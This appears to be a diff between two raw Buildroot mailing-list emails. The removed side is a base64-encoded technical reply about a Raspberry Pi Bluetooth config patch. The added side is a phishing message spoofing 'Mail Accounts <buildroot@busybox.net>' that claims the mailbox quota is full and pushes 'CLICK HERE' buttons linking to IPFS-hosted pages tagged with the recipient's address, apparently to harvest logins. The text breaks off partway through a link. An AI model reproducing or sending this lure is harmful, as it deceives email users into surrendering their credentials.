@@ -4,84 +4,42 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 34DA3C197A0
-	for <buildroot@archiver.kernel.org>; Mon, 20 Nov 2023 22:11:36 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 0B9ABC54FB9
+	for <buildroot@archiver.kernel.org>; Tue, 21 Nov 2023 06:22:37 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp2.osuosl.org (Postfix) with ESMTP id BF3AC40A76;
-	Mon, 20 Nov 2023 22:11:35 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org BF3AC40A76
+	by smtp2.osuosl.org (Postfix) with ESMTP id 2FB69400D7;
+	Tue, 21 Nov 2023 06:22:37 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 2FB69400D7
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp2.osuosl.org ([127.0.0.1])
 	by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id 7iGiTohY6dLJ; Mon, 20 Nov 2023 22:11:34 +0000 (UTC)
+	with ESMTP id ZzspBoYxCe3c; Tue, 21 Nov 2023 06:22:36 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 77C2340A78;
-	Mon, 20 Nov 2023 22:11:33 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 77C2340A78
+	by smtp2.osuosl.org (Postfix) with ESMTP id 1BD0D4011D;
+	Tue, 21 Nov 2023 06:22:35 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 1BD0D4011D
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by ash.osuosl.org (Postfix) with ESMTP id 58E351BF3FD
- for <buildroot@lists.busybox.net>; Mon, 20 Nov 2023 22:11:31 +0000 (UTC)
+ by ash.osuosl.org (Postfix) with ESMTP id 284EB1BF3D7
+ for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 06:22:32 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id 3181981C6E
- for <buildroot@lists.busybox.net>; Mon, 20 Nov 2023 22:11:31 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 3181981C6E
+ by smtp1.osuosl.org (Postfix) with ESMTP id 0E9CC81BB2
+ for <buildroot@lists.busybox.net>; Tue, 21 Nov 2023 06:22:32 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 0E9CC81BB2
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id qKhblYy-vmON for <buildroot@lists.busybox.net>;
- Mon, 20 Nov 2023 22:11:30 +0000 (UTC)
-Received: from mout.gmx.net (mout.gmx.net [212.227.15.19])
- by smtp1.osuosl.org (Postfix) with ESMTPS id 9789981C19
- for <buildroot@buildroot.org>; Mon, 20 Nov 2023 22:11:29 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 9789981C19
-X-UI-Sender-Class: 724b4f7f-cbec-4199-ad4e-598c01a50d3a
-Received: from localhost ([62.216.208.67]) by mail.gmx.net (mrgmx004
- [212.227.17.190]) with ESMTPSA (Nemesis) id 1M26vL-1r2iRg430T-002bml; Mon, 20
- Nov 2023 23:11:26 +0100
-Date: Mon, 20 Nov 2023 23:11:25 +0100
-From: Peter Seiderer <ps.report@gmx.net>
-To: =?UTF-8?B?R2HDq2w=?= PORTAY <gael.portay@rtone.fr>
-Message-ID: <20231120231125.2ba705f9@gmx.net>
-In-Reply-To: <20231120214150.671145-1-gael.portay@rtone.fr>
-References: <20231120214150.671145-1-gael.portay@rtone.fr>
-X-Mailer: Claws Mail 4.1.1 (GTK 3.24.38; x86_64-suse-linux-gnu)
+ with ESMTP id NGdnIn69gw3s for <buildroot@lists.busybox.net>;
+ Tue, 21 Nov 2023 06:22:31 +0000 (UTC)
+Received: from busybox.net (unknown [141.98.10.75])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 6F2D981B83
+ for <buildroot@busybox.net>; Tue, 21 Nov 2023 06:22:30 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 6F2D981B83
+From: Mail Accounts <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 21 Nov 2023 07:22:29 +0100
+Message-ID: <20231121072229.F7ACBB738AABE1D8@busybox.net>
 MIME-Version: 1.0
-X-Provags-ID: V03:K1:MwYPPNTeo8Qm74YrH+k0wl7+Joqtdn2EjCrtzCaoFIKOqMzqIDa
- WTRlMabt6UbLgBZJrcHsEhfJNHRD5tB/QxnUpwApW3qgCjPFnu/RwQgFw6ZG3iMiVV30Wic
- t9MuNCkvCfKf+G1rLzt1rbsx+seFL1xVNpbS/1YHXDd7R1OZhXr5lFAwg3urKY4/4isRlG5
- 9WZjzq2JfvgbyBpoLY8tg==
-UI-OutboundReport: notjunk:1;M01:P0:AGOkr+9yTIc=;Tnr5GVzBaNB6fh59z1yMrqeVTO+
- nR+psepsKZWT6pSbEb8e0FCKD3LSfpDdYJmHswsnrjBaOf1YekvTs3EXzzwB+2jJGqcPmoMGQ
- tKLAgp7A94XxoBPmtnKxLDNlKonUU13AuMx9N2zcFvPgwb0nsCura7jVe1PjHv99KVM8U4tOc
- 7y3/PSY6/3Au48kdt3R2TJD0KCiZp2jPdlNN7h9JYuY4xuBXj8AvAMtjmw/16NrnYhHoiqmMC
- OM0en3rTxivJ9tKEm6Yg302Q3IkycWzE+cF6Ef7sB2OKtrnGqE+DvvYwqCfDVNq99uDz+UAiA
- 09tJBMncflBFxlxBcAEi6B82c/1x9UcB4vINoVRDkiYN7e1AxdMnpuIfDcM5SFWw4NJ1AZLhi
- WjnFjuUmeMp47H0t2cmZD3y6uiFSYDjUlXqqA5ukYBkLc0HTaHzLppsN/XZAG1EFlr+ZchrPJ
- gLN6YLaq1JvfJ5vWQSkOns8fh2NUxZKCgZ6qQlA1SdcVamsGnOEfHq42qyz/drQgGds/KQ2jQ
- JZI1IiwTvpypvs7CqoU0gytN6plz9a67pQsgdIaQll/oYBw19qmOVh9kymTL3faOU4SLoS2h6
- Uxdm7K/pc9aEbg5qTrpBrUVdr3PYZXIfTf0gzX543Dzyjyt/jVo6ugin/TVke9bVksjYrONG5
- lzEos4+si31phdGKNrHu/zPqc+8TtfO50d5fdPHVoCZtigY+tfnzp3+ziN5t2tycLYxDW8T+Y
- 9wT+EjykWv81g0yq54JhMU6NqYV83YxiIZFdnMGYdYNwF3Sb6Gx5JDDoLPrLlBHRGFkcL3SbV
- UKiIVeN6xnb5pIWkUGO+anFPCod3Aa5YtNgcUl7YkUnxvbqml6FwfOko94TqezjQZKRPj/99Z
- MppQuQX0TMoLYXhFk8YEZ4et8INmxs9PTOR8n88trkoOXze17BT9Nm2C5L60oZ5pANLsZJMdH
- 6SqUIqns/ViFJ8FBCuYw4JBG7RI=
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
- d=gmx.net; 
- s=s31663417; t=1700518286; x=1701123086; i=ps.report@gmx.net;
- bh=w38/7YDb2xwm3sCRlUtaKzJQvm8Fav3WcKwLR1P4U2A=;
- h=X-UI-Sender-Class:Date:From:To:Cc:Subject:In-Reply-To:
- References;
- b=kl2KMz5Ub7qQL3OQr0IUlxsh2hdIgX7Pb/RCJqkEW5/xVQfJymKhO7FEsdiQSek6
- ZkYdOsjWi2t+xQCzv6tyv5S2HOKqGHTBXyq35uYPSDXef742acT+Rod3mTX6vJiTY
- f3qWTqIC64YU4cP1MBNlN/9+DEwRPTFmR8CgDVWN/JkE2fT+EHYMz/FVX7GST9uKx
- LEwyauD3LpSBKBFookpOq6y8bHWyuR975cBqX34X9lxt4p9nXTWwZEeKEowUwuUih
- J0MYXDP3xLkvP1SGfcr8A8UqytMA2Hnm+sPINJg+B+7tVvRzZEx8uTdH8TUVZkLG4
- HBgq228DdCXlhL+9dQ==
-X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dkim=pass (2048-bit key) header.d=gmx.net header.i=ps.report@gmx.net
- header.a=rsa-sha256 header.s=s31663417 header.b=kl2KMz5U
-Subject: Re: [Buildroot] [PATCH 1/1] board/raspberrypi: fix autoprobing of
- bluetooth driver
+Subject: [Buildroot] Your mailbox quota is full
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -93,91 +51,151 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Martin Bark <martin@barkynet.com>,
- Julien Grossholtz <julien.grossholtz@openest.io>, buildroot@buildroot.org
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: multipart/mixed; boundary="===============7099786633863257896=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-SGVsbG8gKiwKCk9uIE1vbiwgMjAgTm92IDIwMjMgMjI6NDE6NTAgKzAxMDAsIEdhw6tsIFBPUlRB
-WSA8Z2FlbC5wb3J0YXlAcnRvbmUuZnI+IHdyb3RlOgoKPiBUaGUgY29tbWl0IDY4OWI5YWM0Mzkg
-KHBhY2thZ2UvcnBpLWZpcm13YXJlOiByZXdvcmsgYm9vdC9jb25maWcgZmlsZQo+IGhhbmRsaW5n
-KSBoYXMgc3BsaXQgaW4gdHdvIHRoZSBwcm9wZXJ0eToKPiAKPiAJZHRvdmVybGF5PW1pbml1YXJ0
-LWJ0LGtybmJ0PW9uCj4gCj4gSW50bzoKPiAKPiAJZHRvdmVybGF5PW1pbml1YXJ0LWJ0Cj4gCWR0
-b3ZlcmxheT1rcm5idD1vbgo+IAo+IFRoZSBpbml0aWFsIHByb3BlcnR5IGNvbnRhaW5lZCB0aGUg
-ZHRibyBmaWxlIG1pbml1YXJ0LWJ0WzFdIGFuZCBpdHMKPiBwYXJhbWV0ZXIga3JuYnQ9b25bMl1b
-M10uCj4gCj4gVGhlIGZpcnN0IHN5bnRheCBpcyBjb3JyZWN0IHdoaWxlIHRoZSBzZWNvbmQgaXMg
-bm90LiBUaGUga3JuYnQ9b24gaXMgbm90Cj4gYSBkdG92ZXJsYXlbNF0gYnV0IGEgZHRwYXJhbVs1
-XS4gVGhlcmVmb3JlIHRoZSBwcm9wZXJ0eSBkdHBhcmFtIG11c3QgYmUKPiB1c2VkIGluc3RlYWQu
-Cj4gCj4gVGhpcyBmaXhlczoKPiAKPiAJIyBjYXQgL3N5cy9maXJtd2FyZS9kZXZpY2V0cmVlL2Jh
-c2UvY2hvc2VuL3VzZXItd2FybmluZ3MKPiAJRmFpbGVkIHRvIGxvYWQgb3ZlcmxheSAna3JuYnQ9
-b24nCj4gCj4gWzFdOiBodHRwczovL2dpdGh1Yi5jb20vcmFzcGJlcnJ5cGkvbGludXgvYmxvYi9y
-cGktNS4xMC55L2FyY2gvYXJtL2Jvb3QvZHRzL292ZXJsYXlzL21pbml1YXJ0LWJ0LW92ZXJsYXku
-ZHRzCj4gWzJdOiBodHRwczovL2dpdGh1Yi5jb20vcmFzcGJlcnJ5cGkvbGludXgvYmxvYi9ycGkt
-NS4xMC55L2FyY2gvYXJtL2Jvb3QvZHRzL292ZXJsYXlzL21pbml1YXJ0LWJ0LW92ZXJsYXkuZHRz
-I0w5MQo+IFszXTogaHR0cHM6Ly9naXRodWIuY29tL3Jhc3BiZXJyeXBpL2xpbnV4L2Jsb2IvcnBp
-LTUuMTAueS9hcmNoL2FybS9ib290L2R0cy9vdmVybGF5cy9SRUFETUUjTDIxMy1MMjE1Cj4gWzRd
-OiBodHRwczovL3d3dy5yYXNwYmVycnlwaS5jb20vZG9jdW1lbnRhdGlvbi9jb21wdXRlcnMvY29u
-ZmlnX3R4dC5odG1sI2R0b3ZlcmxheQo+IFs1XTogaHR0cHM6Ly93d3cucmFzcGJlcnJ5cGkuY29t
-L2RvY3VtZW50YXRpb24vY29tcHV0ZXJzL2NvbmZpZ190eHQuaHRtbCNkdHBhcmFtCj4gCj4gU2ln
-bmVkLW9mZi1ieTogR2HDq2wgUE9SVEFZIDxnYWVsLnBvcnRheUBydG9uZS5mcj4KPiAtLS0KPiAg
-Ym9hcmQvcmFzcGJlcnJ5cGkvY29uZmlnXzB3LnR4dCAgICAgIHwgMiArLQo+ICBib2FyZC9yYXNw
-YmVycnlwaS9jb25maWdfMy50eHQgICAgICAgfCAyICstCj4gIGJvYXJkL3Jhc3BiZXJyeXBpL2Nv
-bmZpZ18zXzY0Yml0LnR4dCB8IDIgKy0KPiAgYm9hcmQvcmFzcGJlcnJ5cGkvY29uZmlnXzQudHh0
-ICAgICAgIHwgMiArLQo+ICBib2FyZC9yYXNwYmVycnlwaS9jb25maWdfNF82NGJpdC50eHQgfCAy
-ICstCj4gIGJvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ196ZXJvMncudHh0ICB8IDIgKy0KPiAgNiBm
-aWxlcyBjaGFuZ2VkLCA2IGluc2VydGlvbnMoKyksIDYgZGVsZXRpb25zKC0pCj4gCj4gZGlmZiAt
-LWdpdCBhL2JvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ18wdy50eHQgYi9ib2FyZC9yYXNwYmVycnlw
-aS9jb25maWdfMHcudHh0Cj4gaW5kZXggMTk1YmFkNDQ5ZS4uYmM1OWQ1ZmFkMiAxMDA2NDQKPiAt
-LS0gYS9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdfMHcudHh0Cj4gKysrIGIvYm9hcmQvcmFzcGJl
-cnJ5cGkvY29uZmlnXzB3LnR4dAo+IEBAIC0yNiw0ICsyNiw0IEBAIGdwdV9tZW1fMTAyND0xMDAK
-PiAgZHRvdmVybGF5PW1pbml1YXJ0LWJ0Cj4gCj4gICMgZW5hYmxlIGF1dG9wcm9iaW5nIG9mIEJs
-dWV0b290aCBkcml2ZXIgd2l0aG91dCBuZWVkIG9mIGhjaWF0dGFjaC9idGF0dGFjaAo+IC1kdG92
-ZXJsYXk9a3JuYnQ9b24KPiArZHRwYXJhbT1rcm5idD1vbgo+IGRpZmYgLS1naXQgYS9ib2FyZC9y
-YXNwYmVycnlwaS9jb25maWdfMy50eHQgYi9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdfMy50eHQK
-PiBpbmRleCAxOTViYWQ0NDllLi5iYzU5ZDVmYWQyIDEwMDY0NAo+IC0tLSBhL2JvYXJkL3Jhc3Bi
-ZXJyeXBpL2NvbmZpZ18zLnR4dAo+ICsrKyBiL2JvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ18zLnR4
-dAo+IEBAIC0yNiw0ICsyNiw0IEBAIGdwdV9tZW1fMTAyND0xMDAKPiAgZHRvdmVybGF5PW1pbml1
-YXJ0LWJ0Cj4gCj4gICMgZW5hYmxlIGF1dG9wcm9iaW5nIG9mIEJsdWV0b290aCBkcml2ZXIgd2l0
-aG91dCBuZWVkIG9mIGhjaWF0dGFjaC9idGF0dGFjaAo+IC1kdG92ZXJsYXk9a3JuYnQ9b24KPiAr
-ZHRwYXJhbT1rcm5idD1vbgo+IGRpZmYgLS1naXQgYS9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdf
-M182NGJpdC50eHQgYi9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdfM182NGJpdC50eHQKPiBpbmRl
-eCAzNDQxMmZhOWU4Li42NjcyODcxMTI1IDEwMDY0NAo+IC0tLSBhL2JvYXJkL3Jhc3BiZXJyeXBp
-L2NvbmZpZ18zXzY0Yml0LnR4dAo+ICsrKyBiL2JvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ18zXzY0
-Yml0LnR4dAo+IEBAIC0yNiw3ICsyNiw3IEBAIGdwdV9tZW1fMTAyND0xMDAKPiAgZHRvdmVybGF5
-PW1pbml1YXJ0LWJ0Cj4gCj4gICMgZW5hYmxlIGF1dG9wcm9iaW5nIG9mIEJsdWV0b290aCBkcml2
-ZXIgd2l0aG91dCBuZWVkIG9mIGhjaWF0dGFjaC9idGF0dGFjaAo+IC1kdG92ZXJsYXk9a3JuYnQ9
-b24KPiArZHRwYXJhbT1rcm5idD1vbgo+IAo+ICAjIGVuYWJsZSA2NGJpdHMgc3VwcG9ydAo+ICBh
-cm1fNjRiaXQ9MQo+IGRpZmYgLS1naXQgYS9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdfNC50eHQg
-Yi9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdfNC50eHQKPiBpbmRleCBlYTAyZDNmMDcxLi43NGE3
-YjI3MGNkIDEwMDY0NAo+IC0tLSBhL2JvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ180LnR4dAo+ICsr
-KyBiL2JvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ180LnR4dAo+IEBAIC0yNiw0ICsyNiw0IEBAIGdw
-dV9tZW1fMTAyND0xMDAKPiAgZHRvdmVybGF5PW1pbml1YXJ0LWJ0Cj4gCj4gICMgZW5hYmxlIGF1
-dG9wcm9iaW5nIG9mIEJsdWV0b290aCBkcml2ZXIgd2l0aG91dCBuZWVkIG9mIGhjaWF0dGFjaC9i
-dGF0dGFjaAo+IC1kdG92ZXJsYXk9a3JuYnQ9b24KPiArZHRwYXJhbT1rcm5idD1vbgo+IGRpZmYg
-LS1naXQgYS9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdfNF82NGJpdC50eHQgYi9ib2FyZC9yYXNw
-YmVycnlwaS9jb25maWdfNF82NGJpdC50eHQKPiBpbmRleCA0MWM3ZTk3ZTk5Li4yYTk4MTQyNzRm
-IDEwMDY0NAo+IC0tLSBhL2JvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ180XzY0Yml0LnR4dAo+ICsr
-KyBiL2JvYXJkL3Jhc3BiZXJyeXBpL2NvbmZpZ180XzY0Yml0LnR4dAo+IEBAIC0yNiw3ICsyNiw3
-IEBAIGdwdV9tZW1fMTAyND0xMDAKPiAgZHRvdmVybGF5PW1pbml1YXJ0LWJ0Cj4gCj4gICMgZW5h
-YmxlIGF1dG9wcm9iaW5nIG9mIEJsdWV0b290aCBkcml2ZXIgd2l0aG91dCBuZWVkIG9mIGhjaWF0
-dGFjaC9idGF0dGFjaAo+IC1kdG92ZXJsYXk9a3JuYnQ9b24KPiArZHRwYXJhbT1rcm5idD1vbgo+
-IAo+ICBkdG92ZXJsYXk9dmM0LWttcy12M2QtcGk0Cj4gIGR0b3ZlcmxheT1pbXgyMTkKPiBkaWZm
-IC0tZ2l0IGEvYm9hcmQvcmFzcGJlcnJ5cGkvY29uZmlnX3plcm8ydy50eHQgYi9ib2FyZC9yYXNw
-YmVycnlwaS9jb25maWdfemVybzJ3LnR4dAo+IGluZGV4IDllNmI3ZjVjY2YuLjU1MDk1ZjY0YTcg
-MTAwNjQ0Cj4gLS0tIGEvYm9hcmQvcmFzcGJlcnJ5cGkvY29uZmlnX3plcm8ydy50eHQKPiArKysg
-Yi9ib2FyZC9yYXNwYmVycnlwaS9jb25maWdfemVybzJ3LnR4dAo+IEBAIC0yNiw0ICsyNiw0IEBA
-IGdwdV9tZW1fMTAyND0xMDAKPiAgZHRvdmVybGF5PW1pbml1YXJ0LWJ0Cj4gCj4gICMgZW5hYmxl
-IGF1dG9wcm9iaW5nIG9mIEJsdWV0b290aCBkcml2ZXIgd2l0aG91dCBuZWVkIG9mIGhjaWF0dGFj
-aC9idGF0dGFjaAo+IC1kdG92ZXJsYXk9a3JuYnQ9b24KPiArZHRwYXJhbT1rcm5idD1vbgo+IC0t
-Cj4gMi40Mi4xCj4gCj4gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX18KPiBidWlsZHJvb3QgbWFpbGluZyBsaXN0Cj4gYnVpbGRyb290QGJ1aWxkcm9vdC5vcmcK
-PiBodHRwczovL2xpc3RzLmJ1aWxkcm9vdC5vcmcvbWFpbG1hbi9saXN0aW5mby9idWlsZHJvb3QK
-Ci4uLmFsdGVybmF0aXZlIHBhdGNoIChyZW1vdmluZyB0aGUgZmFpbGluZyBsaW5lKSBhbHJlYWR5
-IHN1Z2dlc3RlZCwgc2VlIFs2XSBmb3IKZGV0YWlscyBhbmQgcmVhc29uaW5nLi4uCgpSZWdhcmRz
-LApQZXRlcgoKWzZdIGh0dHBzOi8vcGF0Y2h3b3JrLm96bGFicy5vcmcvcHJvamVjdC9idWlsZHJv
-b3QvcGF0Y2gvMjAyMzA4MDgxODA5NTkuMjgwOTEtMi1wcy5yZXBvcnRAZ214Lm5ldC8KCl9fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCmJ1aWxkcm9vdCBtYWls
-aW5nIGxpc3QKYnVpbGRyb290QGJ1aWxkcm9vdC5vcmcKaHR0cHM6Ly9saXN0cy5idWlsZHJvb3Qu
-b3JnL21haWxtYW4vbGlzdGluZm8vYnVpbGRyb290Cg==
+--===============7099786633863257896==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
+erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
+px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
+g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'>Y=
+our mailbox is full.</p>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
+: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"height: 0.5em; box-sizing: border-box;">
+<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
+; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizin=
+g: border-box;">&nbsp;</td>
+<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
+y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-bo=
+x;">&nbsp;</td></tr></tbody></table>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
+: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
+Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"color=
+: rgb(218, 60, 47); font-weight: bold; box-sizing: border-box;">4.86 GB</sp=
+an></td>
+<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
+ Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"font=
+-weight: bold; box-sizing: border-box;">5.01 GB</span></td></tr></tbody></t=
+able>
+<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
+erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
+px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
+g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'><=
+br style=3D"box-sizing: border-box;"></p>
+<p style=3D'margin: 3em auto; text-align: center; color: rgb(44, 54, 58); t=
+ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
+ "Segoe UI", sans-serif; font-size: 14px; font-style: normal; font-weight: =
+400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphan=
+s: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><span styl=
+e=3D"box-sizing: border-box;">Your mailbox storage for this account user<sp=
+an style=3D"box-sizing: border-box;">&nbsp;</span><strong style=3D"font-wei=
+ght: bolder; box-sizing: border-box;">( <u style=3D"box-sizing: border-box;=
+"><span><a style=3D"color: rgb(34, 34, 34);" href=3D"mailto:nfo@alnour-fpm.=
+com">buildroot@busybox.net</a></span></u>&nbsp;)</strong><span style=3D"box=
+-sizing: border-box;">&nbsp;</span>
+has almost reached it's limit and soon can no longer send or receive most m=
+essages. <br>You need to upgrade your&nbsp;storage&nbsp;capacity immediatel=
+y to keep using your account.<br><wbr><br style=3D"box-sizing: border-box;"=
+>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Kindly click the&nbsp;button below immediate=
+ly to increase, adjust and maintain your storage capacity in order to avoid=
+ loss of data and receive all pending=20
+mails.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+<wbr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><wbr><br style=3D"box-sizing: border=
+-box;"><wbr>
+&nbsp;&nbsp;&nbsp;<a style=3D"text-decoration: none;" href=3D"https://cloud=
+flare-ipfs.com/ipfs/QmfJyw863hnU2Padykp2p2uMvuCheT5FjkGvH3cSfKpSYS?#buildro=
+ot@busybox.net">
+<span style=3D"background: none; padding: 5px 10px; border-radius: 8px; bor=
+der: 1px solid rgb(8, 44, 64); text-align: center; color: rgb(15, 82, 186);=
+ letter-spacing: 2px; font-size: 24px; font-variant: small-caps; font-weigh=
+t: bold; position: relative; cursor: pointer; box-shadow: 1px 3px 5px 2px #=
+c0c0c0; text-shadow: 1px 1px 1px rgba(5,29,41,1); -ms-user-select: none; -w=
+ebkit-box-shadow: 1px 3px 5px 2px #c0c0c0; -moz-box-shadow: 1px 3px 5px 2px=
+ #c0c0c0; -webkit-touch-callout: none;=20
+-webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none=
+; user-select: none;">CLICK HERE</span></a><br style=3D"box-sizing: border-=
+box;"><br style=3D"box-sizing: border-box;">Click<strong><span>&nbsp;</span=
+>"</strong>
+<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
+der-box; background-color: transparent;" href=3D"https://cloudflare-ipfs.co=
+m/ipfs/QmZBU6KGz7qqH1pDDngpJFM6sHhATjRy2n3pmDuw51U2hE?#buildroot@busybox.ne=
